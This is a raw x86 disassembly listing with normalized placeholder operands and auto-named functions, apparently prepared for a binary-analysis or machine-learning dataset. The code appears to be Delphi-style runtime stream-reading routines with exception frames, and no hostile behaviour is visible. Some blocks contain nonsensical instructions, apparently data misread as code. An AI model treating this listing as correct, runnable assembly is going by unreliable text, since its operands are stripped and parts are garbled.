mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_416de4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_416e04
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_416de4
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418834
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403128
sub_416e64
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416f4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4189d4
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_416f1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_416f4f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416e04
pop ecx
test al al
jne r-xdata
call sub_403930
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038dc
sub_416f74
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416fec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403324
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413404
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_416ff1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416e04
pop ecx
test al al
jne r-xdata
call sub_403930
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038dc
sub_417014
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41708f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4189d4
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403324
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417094
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416e04
pop ecx
test al al
jne r-xdata
call sub_403930
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038dc
sub_4170b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4172d9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418364
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418364
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_4172a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417267
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_416d04
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416d7c
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_416e64
pop ecx
push ebp
call sub_417014
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_416f74
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403960
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416d7c
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_416d7c
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4172e0
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403e9c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404e08
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403324
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413914
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416cc8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41375c
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416cc8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41375c
sub_41726c
push ebp
call sub_416de4
pop ecx
test al al
je r-xdata
call sub_4038dc
call sub_403930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403128
sub_4172f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417364
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41734f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417364
mov eax [ ebp - 0x4 ]
call sub_4168b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4169f8
retn
sub_417364
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41679c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41786c
mov eax [ ebp - 0x4 ]
call sub_417708
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403324
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417426
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403324
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41679c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4170b8
mov eax [ ebp - 0x4 ]
call sub_417708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41742d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417434
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418540
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4176bc
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_416b04
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417478
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418540
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4176bc
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416b04
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_4174bc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418540
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4176bc
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416b04
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41750c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418540
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4176bc
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416b04
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417550
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418540
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_4165dc
mov al [ eax + lookup_table_417577 ]
jmp [ eax * 4 + jump_table_417585 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416b04
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f68
mov eax esi
call j_sub_404344
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416b04
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ecc
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ecc
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ecc
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ecc
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417650
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418540
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416b04
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_416b04
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416b04
jmp r-xdata
jmp r-xdata
call sub_4165dc
sub_4176bc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_416ae0
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417650
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418540
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416b04
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417710
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_416ae0
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418540
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417650
mov [ edi ] eax
sub_41774d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417841
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403e78
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f10
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417848
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040dc
sub_41786c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417a3c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4036f4#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418364
xor edx edx
push ebp
push j_sub_4036f4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404138
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404398
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410700
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410700
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417bf0
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416af0
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410770
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_417850
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a43
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov edi ebx
jmp r-xdata
sub_4179f6
add [ eax ] eax
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ edx ] al
jpe r-xdata
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_4038dc
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a43
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_417a4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_4132ac
mov ebx eax
test ebx ebx
je r-xdata
call sub_4165dc
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4107e4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417a94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416070
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41375c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417ad4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_417b23
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418c58
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410c80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b2a
lea eax [ ebp - 0x10 ]
call sub_40e82c
retn
sub_417b30
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_417be2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_416ae0
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417550
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416070
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41375c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418540
lea eax [ ebp - 0x4 ]
call sub_4054b4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410d34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417be9
lea eax [ ebp - 0x8 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_4054b4
retn
sub_417bf0
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417eeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ef2
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403e9c
lea eax [ ebp - 0x24 ]
call sub_404558
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403e9c
retn
jmp [ eax * 4 + jump_table_417c80 ]
mov eax [ rw-data ]
call sub_4165c4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410770
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416ae0
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416ba0
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417550
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_41069c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417434
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410a74
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4183a0
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410974
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41845c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4109a0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418284
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416ae0
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416ae0
cmp al 0xd
jne r-xdata
push ebp
call sub_417ad4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4176bc
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cf8
jmp r-xdata
push ebp
call sub_417b30
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410770
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417650
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417550
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417a4c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418540
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
